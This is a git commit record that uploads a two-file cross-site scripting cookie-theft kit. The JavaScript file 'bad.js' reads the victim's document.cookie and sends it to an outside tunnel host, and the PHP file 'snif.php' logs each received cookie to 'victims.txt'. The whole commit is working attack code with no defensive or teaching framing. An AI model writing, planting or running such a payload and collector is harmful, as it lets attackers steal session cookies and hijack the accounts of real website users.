da5659a6862b087045db44836ef376673d3a92d5
fare6 <115887650+fare06@users.noreply.github.com>
2025-02-18 22:31:38 +0300

    Add files via upload

---
+++ bad.js
@@ -0,0 +1,4 @@
+var xmlHttp = new XMLHttpRequest();
+ xmlHttp.open("GET", 'https://eb010adc57a6c7.lhr.life/Masaüstü/xss/snif.php?cookie='+document.cookie);
+ xmlHttp.send(null);
+
---
+++ snif.php
@@ -0,0 +1,6 @@
+<?php
+if(isset($_GET["cookie"])){
+    $file = fopen('victims.txt', 'a');
+    fwrite($file, $_GET["cookie"]. "\n");
+    fclose($file);
+}
